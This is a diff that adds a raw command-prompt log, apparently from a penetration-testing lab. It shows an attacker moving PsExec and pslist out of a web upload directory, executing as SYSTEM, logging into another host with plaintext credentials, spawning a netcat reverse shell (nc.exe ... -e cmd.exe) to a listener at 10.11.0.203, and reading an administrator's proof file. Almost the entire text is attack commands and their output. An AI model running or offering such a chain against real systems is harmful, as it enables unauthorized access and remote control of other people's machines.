@@ -1,0 +1,40 @@
+c:\Windows\System32>move C:\wamp\www\PHP\fileManager\collectives\DG0\Upload\PsExec.exe .
+move C:\wamp\www\PHP\fileManager\collectives\DG0\Upload\PsExec.exe .
+        1 file(s) moved.
+c:\Windows\System32>move C:\wamp\www\PHP\fileManager\collectives\DG0\Upload\pslist.exe .
+move C:\wamp\www\PHP\fileManager\collectives\DG0\Upload\pslist.exe .
+        1 file(s) moved.
+
+c:\Windows\System32>psexec -accepteula -s pslist.exe -accepteula
+psexec -accepteula -s pslist.exe -accepteula
+
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+PsList v1.4 - Process information lister
+Copyright (C) 2000-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Starting pslist.exe on GAMMA...on GAMMA.....
+pslist.exe exited on GAMMA with error code 0.
+
+c:\Windows\System32>PsExec.exe \\10.11.1.73 -u dicknose -p dicknose cmd.exe
+
+
+psexec.exe \\GAMMA -u dicknose -p dicknose -s %HOMEPATH%\Documents\nc.exe 10.11.0.203 1338 -e cmd.exe
+
+nc -lvp 1338
+whoami
+type c:\Users\admin\Desktop\proof.txt
+
+C:\Windows\system32>type c:\Users\admin\Desktop\proof.txt
+type c:\Users\admin\Desktop\proof.txt
+e18a24030ad7c23250b41c2fd257c71e 
+
+C:\Windows\system32>REM FUCK YOU WINDOWS!
+REM FUCK YOU WINDOWS!
+
+C:\Windows\system32>
+
